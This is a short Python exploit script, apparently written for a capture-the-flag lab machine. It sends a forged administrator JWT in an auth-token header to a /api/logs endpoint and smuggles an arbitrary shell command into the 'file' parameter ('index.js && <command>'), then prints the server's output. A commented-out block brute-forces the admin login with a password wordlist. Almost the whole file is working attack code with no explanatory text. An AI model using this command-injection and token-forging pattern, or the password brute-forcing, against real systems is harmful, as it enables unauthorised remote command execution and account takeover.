import requests
import sys
import json

fil = sys.argv[1]
#print(fil)
# end = "http://10.10.11.120:3000/api/user/login"
he = {'auth-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjAyMjAxMTVlMWE0MDA0NWYyNWMxMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ0MzA2NDg0fQ.jo4lb2gBO7DQF2SEPPqbOW_1YUZuYYefL75hoP21dz4'}
end = "http://10.10.11.120:3000/api/logs"

pay = {'file':'index.js && {}'.format(fil)}

r = requests.get(end, params=pay, headers = he)

print(r.status_code)
print(r.text)

#pay = '{"email": "admin@dasith.works", "password": "Password123"}'
#he = {'Content-Type': 'application/json'}

'''pas = [w.strip() for w in open(fil, "rb").readlines()]
for p in pas:
    #print(p)
    pay = {"email": "admin@dasith.works", "password": p}
    he = {'Content-Type': 'application/json'}
    r = requests.post(end, json = pay)
    print(r.text)
    if(r.status_code == 200):
        print("[+] Cracked Password: ", p)
        break
    '''
